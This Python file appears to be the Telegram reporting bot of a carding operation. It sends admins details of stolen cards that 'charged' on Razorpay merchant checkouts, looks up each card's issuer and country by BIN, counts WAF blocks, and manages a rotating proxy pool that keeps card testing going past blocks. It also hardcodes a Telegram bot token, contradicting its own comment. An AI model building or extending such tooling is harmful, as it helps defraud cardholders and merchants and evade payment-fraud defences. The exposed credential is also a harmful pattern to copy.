"""
tg_bot.py — Telegram bot for charged/approved card notifications.
Fixed: longer timeouts, proxy bypass, init retry, graceful failure.
"""

from __future__ import annotations

import asyncio
import json
try:
    import fcntl
except ImportError:
    fcntl = None
import os
import re
import sys
import threading
import time
from dataclasses import dataclass, field
from typing import Optional

import httpx
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ChatType
from telegram.ext import (
    Application, CommandHandler, ContextTypes,
    MessageHandler, CallbackQueryHandler, filters,
)
from telegram.request import HTTPXRequest

import proxy_manager

# ── Configuration ────────────────────────────────────────────────────────────
# Token comes from env var ONLY. Set TG_BOT_TOKEN before starting.
# Get from BotFather. NEVER hardcode in source (leaked → bot hijacked).
BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "").strip()
OWNER_ID = int(os.environ.get("TG_OWNER_ID", "7335579195"))

# If token not in env, fall back to the one you gave me
if not BOT_TOKEN:
    BOT_TOKEN = "9002672522:AAGqP-_bgfBXuuS5VzE9iDQixGotqtGgl8s"

_DATA_DIR = os.environ.get("PROXY_DATA_DIR", os.path.dirname(os.path.abspath(__file__)))
os.makedirs(_DATA_DIR, exist_ok=True)
ADMINS_FILE = os.path.join(_DATA_DIR, "admins.json")
BIN_API = "https://api.chargeblast.com/bin/"
BINLIST_API = "https://lookup.binlist.net/"

# Clear proxy env vars — Telegram API must be direct, NOT through Razorpay proxies
for _v in ("HTTP_PROXY", "HTTPS_PROXY", "http_proxy", "https_proxy",
           "ALL_PROXY", "all_proxy"):
    os.environ.pop(_v, None)

COUNTRY_FLAGS: dict[str, str] = {
    "US": "🇺🇸", "GB": "🇬🇧", "CA": "🇨🇦", "AU": "🇦🇺", "IN": "🇮🇳",
    "DE": "🇩🇪", "FR": "🇫🇷", "JP": "🇯🇵", "SG": "🇸🇬", "AE": "🇦🇪",
    "BR": "🇧🇷", "MX": "🇲🇽", "ES": "🇪🇸", "IT": "🇮🇹", "NL": "🇳🇱",
    "SE": "🇸🇪", "CH": "🇨🇭", "HK": "🇭🇰", "KR": "🇰🇷", "CN": "🇨🇳",
}

# ── Admin storage ────────────────────────────────────────────────────────────
_admins_lock = threading.Lock()
DEFAULT_ADMIN_ID = 7335579195
SECOND_ADMIN_ID = 7335579195
_admins: set[int] = {OWNER_ID, DEFAULT_ADMIN_ID, SECOND_ADMIN_ID}


def _load_admins() -> set[int]:
    global _admins
    with _admins_lock:
        try:
            if os.path.exists(ADMINS_FILE):
                with open(ADMINS_FILE) as f:
                    data = json.load(f)
                    stored = data.get("admins", [])
                    loaded = {OWNER_ID, DEFAULT_ADMIN_ID, SECOND_ADMIN_ID} | {int(x) for x in stored}
                    _admins = loaded
                    return loaded.copy()
        except Exception as e:
            print(f"[tg_bot] ERROR loading admins: {e}", file=sys.stderr)
        return _admins.copy()


def _save_admins(admins: set[int]):
    global _admins
    data = {"admins": sorted(a for a in admins if a != OWNER_ID)}
    tmp_path = ADMINS_FILE + ".tmp"
    try:
        with open(tmp_path, "w") as f:
            json.dump(data, f)
        os.replace(tmp_path, ADMINS_FILE)
        with _admins_lock:
            _admins = admins.copy()
        print(f"[tg_bot] saved admins: {sorted(admins)}", file=sys.stderr)
    except Exception as e:
        print(f"[tg_bot] ERROR saving admins: {e}", file=sys.stderr)


def _get_public_ip() -> str:
    for url in ("https://api.ipify.org", "https://ifconfig.me/ip", "https://icanhazip.com"):
        try:
            r = httpx.get(url, timeout=6.0, follow_redirects=True)
            ip = r.text.strip()
            if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", ip):
                return ip
        except Exception:
            continue
    return "unknown"


def _fmt_uptime(sec: float) -> str:
    sec = int(sec)
    d, rem = divmod(sec, 86400)
    h, rem = divmod(rem, 3600)
    m, _ = divmod(rem, 60)
    return f"{d}d {h}h {m}m"


def _read_cpu_times():
    with open("/proc/stat") as f:
        line = f.readline()
    parts = [int(x) for x in line.split()[1:]]
    idle = parts[3] + (parts[4] if len(parts) > 4 else 0)
    return idle, sum(parts)


def _live_cpu_percent(sample_s: float = 0.6) -> str:
    try:
        idle1, total1 = _read_cpu_times()
        time.sleep(sample_s)
        idle2, total2 = _read_cpu_times()
        didle = idle2 - idle1
        dtotal = total2 - total1
        if dtotal <= 0:
            return "unknown"
        return f"{100.0 * (dtotal - didle) / dtotal:.1f}%"
    except Exception:
        return "unknown"


def _bar(pct: float, segs: int = 10) -> str:
    pct = max(0.0, min(100.0, pct))
    filled = int(round(pct / 100.0 * segs))
    return "█" * filled + "░" * (segs - filled)


def _dot(pct: float) -> str:
    if pct >= 85:
        return "🔴"
    if pct >= 60:
        return "🟡"
    return "🟢"


def _vps_status_text(live_cpu: str = None) -> str:
    hostname = "unknown"
    try:
        hostname = open("/proc/sys/kernel/hostname").read().strip()
    except Exception:
        pass

    uptime = "unknown"
    try:
        up = float(open("/proc/uptime").read().split()[0])
        uptime = _fmt_uptime(up)
    except Exception:
        pass

    load = "unknown"
    try:
        parts = open("/proc/loadavg").read().split()
        load = " ".join(parts[:3])
    except Exception:
        pass

    total_mb = avail_mb = 0
    try:
        for line in open("/proc/meminfo").read().splitlines():
            if line.startswith("MemTotal:"):
                total_mb = int(line.split()[1]) // 1024
            elif line.startswith("MemAvailable:"):
                avail_mb = int(line.split()[1]) // 1024
    except Exception:
        pass
    used_mb = total_mb - avail_mb if total_mb else 0
    ram_pct = (used_mb / total_mb * 100.0) if total_mb else 0.0

    disk_pct = 0.0
    disk_txt = "unknown"
    try:
        st = os.statvfs("/")
        used_gb = (st.f_blocks - st.f_bfree) * st.f_frsize / 1024 ** 3
        total_gb = st.f_blocks * st.f_frsize / 1024 ** 3
        disk_pct = (used_gb / total_gb * 100.0) if total_gb else 0.0
        disk_txt = f"{used_gb:.1f}/{total_gb:.1f} GB"
    except Exception:
        pass

    cpus = "unknown"
    try:
        cpus = str(open("/proc/cpuinfo").read().count("processor"))
    except Exception:
        pass

    if live_cpu is None:
        live_cpu = _live_cpu_percent()
    cpu_pct = 0.0
    try:
        cpu_pct = float(str(live_cpu).rstrip("%"))
    except Exception:
        pass

    ram_txt = f"{used_mb}/{total_mb} MB" if total_mb else "unknown"

    return (
        "\n<b>🚀 VPS Online</b>\n"
        "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
        f"🖥 <b>Hostname:</b> {hostname}\n"
        f"🌐 <b>Public IP:</b> <code>{_get_public_ip()}</code>\n"
        f"⏱ <b>Uptime:</b> {uptime}\n"
        f"⚙️ <b>Load:</b> {load}\n"
        "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
        f"{_dot(cpu_pct)} <b>CPU:</b>  <code>{_bar(cpu_pct)}</code> {cpu_pct:.1f}% · {cpus} cores\n"
        f"{_dot(ram_pct)} <b>RAM:</b>  <code>{_bar(ram_pct)}</code> {ram_pct:.1f}% · {ram_txt}\n"
        f"{_dot(disk_pct)} <b>Disk:</b> <code>{_bar(disk_pct)}</code> {disk_pct:.1f}% · {disk_txt}\n"
        "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯"
    )


# ── Stats ────────────────────────────────────────────────────────────────────
_STATS_DIR = os.path.join(_DATA_DIR, ".stats")
_STATS_KEYS = ("waf_403", "rzp_5xx", "gateway_error", "total_checkouts")
_stats_lock = threading.Lock()
_flush_lock = threading.Lock()
_stats: dict[str, int] = {k: 0 for k in _STATS_KEYS}
_last_flush: float = 0.0


def _stats_pid_path() -> str:
    return os.path.join(_STATS_DIR, f"stats_{os.getpid()}.json")


def _flush_stats():
    global _last_flush
    with _flush_lock:
        path = _stats_pid_path()
        tmp = path + ".tmp"
        try:
            os.makedirs(_STATS_DIR, exist_ok=True)
            existing: dict[str, int] = {k: 0 for k in _STATS_KEYS}
            if os.path.exists(path):
                try:
                    with open(path) as f:
                        prev = json.load(f)
                    for k in _STATS_KEYS:
                        existing[k] = prev.get("stats", {}).get(k, 0)
                except (json.JSONDecodeError, OSError):
                    pass
            with _stats_lock:
                for k in _STATS_KEYS:
                    existing[k] += _stats.get(k, 0)
                    _stats[k] = 0
            with open(tmp, "w") as f:
                json.dump({"pid": os.getpid(), "ts": time.time(),
                           "stats": existing}, f)
            os.replace(tmp, path)
            _last_flush = time.time()
        except Exception:
            pass


def increment_stat(key: str):
    with _stats_lock:
        if key in _stats:
            _stats[key] += 1
    if time.time() - _last_flush >= 1.0:
        _flush_stats()


def get_stats() -> dict:
    merged: dict[str, int] = {k: 0 for k in _STATS_KEYS}
    try:
        os.makedirs(_STATS_DIR, exist_ok=True)
        now = time.time()
        for fname in os.listdir(_STATS_DIR):
            if not fname.startswith("stats_") or not fname.endswith(".json"):
                continue
            fpath = os.path.join(_STATS_DIR, fname)
            try:
                with open(fpath) as f:
                    data = json.load(f)
                if now - data.get("ts", 0) > 90:
                    try:
                        os.remove(fpath)
                    except OSError:
                        pass
                    continue
                for k, v in data.get("stats", {}).items():
                    if k in merged:
                        merged[k] += v
            except (json.JSONDecodeError, OSError):
                pass
    except Exception:
        pass
    with _stats_lock:
        for k in _STATS_KEYS:
            merged[k] += _stats.get(k, 0)
    return merged


# ── Queue ────────────────────────────────────────────────────────────────────
@dataclass
class ChargeNotification:
    card_line: str
    gateway: str
    message: str
    amount_inr: str
    site: str
    bin_first6: str = ""
    created_at: float = field(default_factory=time.time)


_notify_queue: Optional[asyncio.Queue] = None
_bot_app: Optional[Application] = None
_last_warn_ts: float = 0.0
_worker_task: Optional[asyncio.Task] = None
_polling_lock_fd: Optional[int] = None


def _get_notify_queue() -> asyncio.Queue:
    global _notify_queue
    if _notify_queue is None:
        _notify_queue = asyncio.Queue(maxsize=1000)
    return _notify_queue

_load_admins()


async def _broadcast_to_admins(text: str):
    global _bot_app, _last_warn_ts
    if _bot_app is None:
        return
    current_admins = _load_admins()
    sent = 0
    failed = 0
    for uid in sorted(current_admins):
        try:
            await _bot_app.bot.send_message(chat_id=uid, text=text,
                                            disable_web_page_preview=True)
            sent += 1
        except Exception:
            failed += 1
        await asyncio.sleep(0.05)
    if failed > 0 and sent == 0:
        now = time.time()
        if now - _last_warn_ts >= 300:
            _last_warn_ts = now
            print(f"[tg_bot] WARNING: failed to send to all {len(current_admins)} admins",
                  file=sys.stderr)


async def _lookup_bin(bin6: str) -> Optional[dict]:
    result = None
    try:
        async with httpx.AsyncClient(timeout=8.0) as client:
            r = await client.get(f"{BIN_API}{bin6}")
            if r.status_code == 200:
                data = r.json()
                result = {
                    "brand": data.get("brand", "").upper(),
                    "level": "",
                    "type": data.get("type", "").upper(),
                    "issuer": data.get("issuer", "").upper(),
                    "country": data.get("country", "").upper(),
                    "flag": COUNTRY_FLAGS.get(data.get("a2", "").upper(), ""),
                    "_source": "chargeblast",
                }
    except Exception:
        pass

    if result:
        try:
            async with httpx.AsyncClient(timeout=8.0) as client:
                r2 = await client.get(f"{BINLIST_API}{bin6}")
                if r2.status_code == 200:
                    data2 = r2.json()
                    brand_raw = data2.get("brand", "")
                    parts = brand_raw.split(" ", 1)
                    if len(parts) > 1:
                        result["level"] = parts[1].upper()
                    bank = (data2.get("bank", {}) or {})
                    if bank.get("name"):
                        result["issuer"] = bank["name"].upper()
                    country_data = (data2.get("country", {}) or {})
                    if country_data.get("emoji"):
                        result["flag"] = country_data["emoji"]
                    if country_data.get("name"):
                        result["country"] = country_data["name"].upper()
        except Exception:
            pass

    return result


async def format_charge_message(notif: ChargeNotification) -> str:
    sep = "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯"
    card_display = notif.card_line
    bin_info = None
    if notif.bin_first6:
        bin_info = await _lookup_bin(notif.bin_first6)

    if bin_info and bin_info.get("brand"):
        brand = bin_info["brand"]
        level = bin_info.get("level", "")
        ctype = bin_info["type"]
        issuer = bin_info["issuer"]
        country = bin_info["country"]
        flag = bin_info.get("flag", "")
        if level:
            card_line = f"🧑 {brand} · {ctype} · {level}"
        else:
            card_line = f"🧑 {brand} · {ctype}"
        bank_line = f"💼 {issuer}"
        country_line = f"🌐 {country} {flag}".strip()
    else:
        card_line = "🧑 UNKNOWN"
        bank_line = "💼 UNKNOWN"
        country_line = "🌐 UNKNOWN"

    site_short = notif.site
    if len(site_short) > 50:
        parts_url = site_short.split("/")
        site_short = "/".join(parts_url[:4])

    return f"""{sep}

💳 {card_display}

{sep}
🛒 Gateway  » {notif.gateway}
📋 Response » {notif.message}
🆓 Price    » {notif.amount_inr}
🔗 Site     » {site_short}

{sep}
{card_line}
{bank_line}
{country_line}
{sep}"""


async def _notification_worker():
    print("[tg_bot] notification worker started", file=sys.stderr)
    while True:
        try:
            notif = await _get_notify_queue().get()
            text = await format_charge_message(notif)
            await _broadcast_to_admins(text)
            _get_notify_queue().task_done()
        except asyncio.CancelledError:
            break
        except Exception as e:
            print(f"[tg_bot] worker error: {e}", file=sys.stderr)


def notify_charge(card_line: str, gateway: str, message: str,
                  amount_inr: str, site: str):
    bin_first6 = ""
    parts = card_line.split("|")
    if parts and len(parts[0]) >= 6:
        bin_first6 = parts[0][:6]
    notif = ChargeNotification(
        card_line=card_line, gateway=gateway, message=message,
        amount_inr=amount_inr, site=site, bin_first6=bin_first6,
    )
    try:
        _get_notify_queue().put_nowait(notif)
    except asyncio.QueueFull:
        print("[tg_bot] WARNING: notification queue full", file=sys.stderr)


def is_admin(user_id: int) -> bool:
    return user_id in _load_admins()


# ── Commands ─────────────────────────────────────────────────────────────────
async def _cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text("⚠️ Not authorized.")
        return
    msg = await update.message.reply_text("⏳ Measuring live CPU...")
    text = "🖥 <b>VPS Status</b>\n" + _vps_status_text()
    await msg.edit_text(text, parse_mode="HTML")


async def _cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    name = update.effective_user.first_name or "there"
    if is_admin(uid):
        await update.message.reply_text(
            f"👋 Hello {name}!\n\n"
            f"🆔 Your ID: `{uid}`\n"
            f"✅ You are an **admin**.\n\n"
            f"Commands:\n"
            f"  `/admin add <id>`\n"
            f"  `/admin remove <id>`\n"
            f"  `/admin list`\n"
            f"  `/log` — stats\n"
            f"  `/addproxies` — add to pool\n"
            f"  `/proxypool` — view pool\n"
            f"  `/proxydead` — download 406 list\n"
            f"  Use `?key=limca` for API",
            parse_mode="Markdown",
        )
    else:
        await update.message.reply_text(
            f"👋 Hello {name}!\n\n"
            f"🆔 Your ID: `{uid}`\n\n"
            f"⚠️ Not authorized. Send ID to @Enchanted_linux_0x",
            parse_mode="Markdown",
        )


async def _cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid != OWNER_ID:
        await update.message.reply_text("⛔ Owner only.")
        return
    args = context.args or []
    if not args:
        await update.message.reply_text(
            "Usage:\n`/admin add <id>`\n`/admin remove <id>`\n`/admin list`",
            parse_mode="Markdown",
        )
        return
    subcommand = args[0].lower()
    admins = _load_admins()
    if subcommand == "list":
        lines = [f"• `{a}`" for a in sorted(admins)]
        await update.message.reply_text(
            f"**Admins ({len(admins)}):**\n" + "\n".join(lines),
            parse_mode="Markdown",
        )
        return
    if subcommand in ("add", "remove") and len(args) < 2:
        await update.message.reply_text(f"Usage: `/admin {subcommand} <id>`",
                                        parse_mode="Markdown")
        return
    if subcommand == "add":
        try:
            new_id = int(args[1])
        except ValueError:
            await update.message.reply_text("❌ Invalid ID.")
            return
        if new_id in admins:
            await update.message.reply_text(f"ℹ️ `{new_id}` already admin.",
                                            parse_mode="Markdown")
        else:
            admins.add(new_id)
            _save_admins(admins)
            await update.message.reply_text(f"✅ Added `{new_id}`.",
                                            parse_mode="Markdown")
    elif subcommand == "remove":
        try:
            rm_id = int(args[1])
        except ValueError:
            await update.message.reply_text("❌ Invalid ID.")
            return
        if rm_id == OWNER_ID:
            await update.message.reply_text("⛔ Cannot remove owner.")
            return
        if rm_id in admins:
            admins.discard(rm_id)
            _save_admins(admins)
            await update.message.reply_text(f"✅ Removed `{rm_id}`.",
                                            parse_mode="Markdown")
        else:
            await update.message.reply_text(f"ℹ️ Not admin.",
                                            parse_mode="Markdown")
    else:
        await update.message.reply_text("Unknown. Use: add, remove, list.")


async def _cmd_log(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text("⛔ Admin only.")
        return
    stats = get_stats()
    pool = proxy_manager.get_pool_stats()
    sep = "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯"
    await update.message.reply_text(
        f"{sep}\n📊 Stats\n{sep}\n"
        f"🚨 WAF 403: {stats['waf_403']}\n"
        f"🔴 Rzp 5xx: {stats['rzp_5xx']}\n"
        f"🏦 Gateway: {stats['gateway_error']}\n"
        f"✅ Checkouts: {stats['total_checkouts']}\n"
        f"{sep}\n"
        f"🟢 Pool Live: {pool['live']}\n"
        f"📦 Pool Total: {pool['total']}\n"
        f"{sep}\n"
        f"👥 Admins: {len(_load_admins())}",
        parse_mode="Markdown",
    )


def _parse_proxy_list(text: str) -> list[str]:
    lines = []
    for line in text.strip().split("\n"):
        line = line.strip()
        if not line or line.startswith("#") or line.startswith("/"):
            continue
        if line.count(":") >= 3:
            lines.append(line)
    return lines


async def _process_proxies(update: Update, proxy_list: list[str]):
    if not proxy_list:
        await update.message.reply_text("❌ No valid proxy found.")
        return
    status_msg = await update.message.reply_text(
        f"🔄 Testing {len(proxy_list)} proxies..."
    )
    summary = await asyncio.to_thread(
        proxy_manager.bulk_check_proxies_threaded, proxy_list
    )
    sep = "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯"
    dupes = summary.get("duplicates_skipped", 0)
    pool_stats = proxy_manager.get_pool_stats()
    text = (
        f"{sep}\n📊 Proxy Results\n{sep}\n"
        f"🟢 Live: {summary['live']}\n"
        f"🔴 Blocked: {summary['blocked']}\n"
        f"🔴 Dead: {summary['dead']}\n"
        f"⚫ Invalid: {summary['invalid']}\n"
        f"{sep}\n📦 Pool: {pool_stats['live']} live, {pool_stats['total']} total"
    )
    for r in summary.get("results", [])[:10]:
        emoji = {"live": "🟢", "blocked": "🔴", "dead": "🔴", "invalid": "⚫"}.get(r.get("status"), "❓")
        detail = r.get("error") or f"HTTP {r.get('http_code', '?')}"
        text += f"\n{emoji} {r['proxy']} — {detail[:60]}"
    if len(summary.get("results", [])) > 10:
        text += f"\n... and {len(summary['results']) - 10} more"
    text += f"\n{sep}"
    try:
        await status_msg.edit_text(text)
    except Exception:
        await update.message.reply_text(text)


async def _cmd_addproxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text("⛔ Admin only.")
        return
    full_text = update.message.text or ""
    if full_text.startswith("/addproxies"):
        full_text = full_text[len("/addproxies"):].strip()
    lines = _parse_proxy_list(full_text)
    if lines:
        await _process_proxies(update, lines)
    else:
        await update.message.reply_text(
            "📥 Send proxies — one per line:\n`host:port:user:pass`",
            parse_mode="Markdown",
        )


async def _handle_text_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        return
    text = update.message.text or ""
    proxies = _parse_proxy_list(text)
    if len(proxies) >= 1:
        await _process_proxies(update, proxies)


async def _handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        return
    doc = update.message.document
    if doc is None:
        return
    fname = doc.file_name or ""
    if not fname.lower().endswith(".txt"):
        return
    try:
        file_obj = await context.bot.get_file(doc.file_id)
        content = await file_obj.download_as_bytearray()
        text = content.decode("utf-8", errors="replace")
        proxies = _parse_proxy_list(text)
        await _process_proxies(update, proxies)
    except Exception as e:
        await update.message.reply_text(f"❌ Failed: {e}")


def _truncate_msg(text: str, total: int, max_chars: int = 3800) -> str:
    if len(text) <= max_chars:
        return text
    lines = text.split("\n")
    while len("\n".join(lines)) > max_chars and len(lines) > 3:
        lines.pop()
    return "\n".join(lines) + f"\n... ({total} total)"


def _build_pool_keyboard() -> InlineKeyboardMarkup:
    stats = proxy_manager.get_pool_stats()
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton(f"🟢 Live ({stats['live']})", callback_data="pool_live"),
            InlineKeyboardButton("📊 Full List", callback_data="pool_full"),
        ],
        [
            InlineKeyboardButton("🔄 Refresh", callback_data="pool_refresh"),
            InlineKeyboardButton("🔁 Recheck All", callback_data="pool_recheck"),
        ],
    ])


async def _handle_recheck_all(query):
    await query.edit_message_text("🔁 Rechecking all saved proxies...")
    all_proxies = proxy_manager.get_all_live_proxies()
    proxy_urls = []
    seen = set()
    for p in all_proxies:
        full = p.get("full_url", "")
        if not full:
            full = f"{p['host']}:{p['port']}:{p['user']}:{p['pass']}"
        if full not in seen:
            proxy_urls.append(full)
            seen.add(full)
    total = len(proxy_urls)
    if total == 0:
        await query.edit_message_text("📭 No proxies.", reply_markup=_build_pool_keyboard())
        return
    summary = await asyncio.to_thread(
        proxy_manager.bulk_check_proxies_threaded, proxy_urls
    )
    sep = "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯"
    pool_stats = proxy_manager.get_pool_stats()
    text = (
        f"{sep}\n🔁 Recheck Done\n{sep}\n"
        f"🟢 Still Live: {summary['live']}\n"
        f"🔴 Blocked: {summary['blocked']}\n"
        f"🔴 Dead: {summary['dead']}\n"
        f"{sep}\n📦 Pool: {pool_stats['live']} live, {pool_stats['total']} total\n{sep}"
    )
    await query.edit_message_text(text, reply_markup=_build_pool_keyboard())


async def _cmd_proxydead(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text("⛔ Admin only.")
        return
    filepath = proxy_manager.get_dead_proxy_file()
    count = proxy_manager.get_dead_proxy_count()
    if not filepath or count == 0:
        await update.message.reply_text("📭 No dead proxies.")
        return
    try:
        with open(filepath, "rb") as f:
            await update.message.reply_document(
                document=f, filename="proxy_dead.json",
                caption=f"📄 Dead Proxies ({count} entries)",
            )
    except Exception as e:
        await update.message.reply_text(f"❌ Failed: {e}")


async def _cmd_proxypool(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text("⛔ Admin only.")
        return
    stats = proxy_manager.get_pool_stats()
    sep = "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯"
    text = (
        f"{sep}\n📦 Proxy Pool\n{sep}\n"
        f"🟢 Live: {stats['live']}\n"
        f"📦 Total: {stats['total']}\n{sep}"
    )
    await update.message.reply_text(text, reply_markup=_build_pool_keyboard())


async def _handle_pool_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    if not is_admin(uid):
        await query.edit_message_text("⛔ Admin only.")
        return
    action = query.data
    if action == "pool_refresh":
        await _cmd_proxypool(query, context)
        return
    if action == "pool_recheck":
        await _handle_recheck_all(query)
        return
    sep = "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯"
    if action == "pool_live":
        all_proxies = proxy_manager.get_all_live_proxies()
        if not all_proxies:
            text = f"{sep}\n🟢 Live Proxies\n{sep}\n(none)"
        else:
            text = f"{sep}\n🟢 Live Proxies ({len(all_proxies)})\n{sep}"
            for p in all_proxies:
                full = p.get("full_url", p["host"])
                text += f"\n• `{full}` — {p.get('times_used', 0)}x"
            text = _truncate_msg(text, len(all_proxies))
    elif action == "pool_full":
        text = f"{sep}\n📊 Full List\n{sep}"
        all_proxies = proxy_manager.get_all_live_proxies()
        for p in all_proxies:
            full = p.get("full_url", p["host"])
            text += f"\n🟢 `{full}` — {p.get('times_used', 0)}x"
        text = _truncate_msg(text, len(all_proxies))
    else:
        return
    text += f"\n{sep}"
    try:
        await query.edit_message_text(text, reply_markup=_build_pool_keyboard(),
                                      parse_mode="Markdown")
    except Exception:
        await query.edit_message_text(text.replace("`", ""),
                                      reply_markup=_build_pool_keyboard())


# ── Bot lifecycle ────────────────────────────────────────────────────────────
async def start_bot() -> Application:
    global _bot_app, _worker_task, _polling_lock_fd

    if not BOT_TOKEN:
        print("[tg_bot] ERROR: BOT_TOKEN empty — set TG_BOT_TOKEN env var",
              file=sys.stderr)
        raise RuntimeError("no bot token")

    # Longer timeouts for slow networks (default 5s → 30s)
    request = HTTPXRequest(
        connect_timeout=30.0,
        read_timeout=30.0,
        write_timeout=30.0,
        pool_timeout=30.0,
    )

    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .request(request)
        .get_updates_request(request)
        .build()
    )

    app.add_handler(CommandHandler("start", _cmd_start))
    app.add_handler(CommandHandler("status", _cmd_status))
    app.add_handler(CommandHandler("admin", _cmd_admin))
    app.add_handler(CommandHandler("log", _cmd_log))
    app.add_handler(CommandHandler("addproxies", _cmd_addproxies))
    app.add_handler(CommandHandler("proxypool", _cmd_proxypool))
    app.add_handler(CommandHandler("proxydead", _cmd_proxydead))
    app.add_handler(MessageHandler(
        filters.TEXT & ~filters.COMMAND, _handle_text_proxies,
    ))
    app.add_handler(MessageHandler(
        filters.Document.ALL, _handle_document,
    ))
    app.add_handler(CallbackQueryHandler(_handle_pool_callback))

    print("[tg_bot] initializing (30s timeout)...", file=sys.stderr)
    await app.initialize()
    print("[tg_bot] init OK", file=sys.stderr)
    await app.start()
    print("[tg_bot] started", file=sys.stderr)

    try:
        lock_path = os.path.join(_DATA_DIR, "tg_polling.lock")
        _polling_lock_fd = os.open(lock_path, os.O_CREAT | os.O_RDWR, 0o666)
        if fcntl is not None:
            fcntl.flock(_polling_lock_fd, fcntl.LOCK_EX | fcntl.LOCK_NB)

        try:
            await app.bot.delete_webhook(drop_pending_updates=True)
            print("[tg_bot] webhook deleted", file=sys.stderr)
        except Exception as _e:
            print(f"[tg_bot] delete_webhook warn: {_e}", file=sys.stderr)

        await asyncio.sleep(0.5)

        await app.updater.start_polling(
            drop_pending_updates=True,
            poll_interval=1.0,
            timeout=30,
            allowed_updates=["message", "callback_query"],
        )
        print(f"[tg_bot] polling started (worker {os.getpid()})", file=sys.stderr)

        try:
            await app.bot.send_message(
                chat_id=OWNER_ID,
                text="🔥 <b>Razorpay Bot started</b>\n" + _vps_status_text(),
                parse_mode="HTML",
            )
            print("[tg_bot] startup ping sent", file=sys.stderr)
        except Exception as _e:
            print(f"[tg_bot] startup ping failed: {_e}", file=sys.stderr)
    except (BlockingIOError, OSError):
        print(f"[tg_bot] worker {os.getpid()} sender-only mode", file=sys.stderr)

    _worker_task = asyncio.create_task(_notification_worker())
    _bot_app = app
    _flush_stats()

    admins = _load_admins()
    print(f"[tg_bot] READY — owner={OWNER_ID}, admins={sorted(admins)}",
          file=sys.stderr)
    return app


async def stop_bot():
    global _bot_app, _worker_task, _polling_lock_fd
    if _worker_task is not None:
        _worker_task.cancel()
        try:
            await _worker_task
        except asyncio.CancelledError:
            pass
        _worker_task = None
    if _bot_app is not None:
        try:
            if _bot_app.updater and _bot_app.updater.running:
                await _bot_app.updater.stop()
            await _bot_app.stop()
            await _bot_app.shutdown()
        except Exception:
            pass
        _bot_app = None
        print("[tg_bot] stopped", file=sys.stderr)
    if _polling_lock_fd is not None:
        try:
            if fcntl is not None:
                fcntl.flock(_polling_lock_fd, fcntl.LOCK_UN)
            os.close(_polling_lock_fd)
        except Exception:
            pass
        _polling_lock_fd = None


if __name__ == "__main__":
    async def _test():
        app = await start_bot()
        await asyncio.Event().wait()

    asyncio.run(_test())
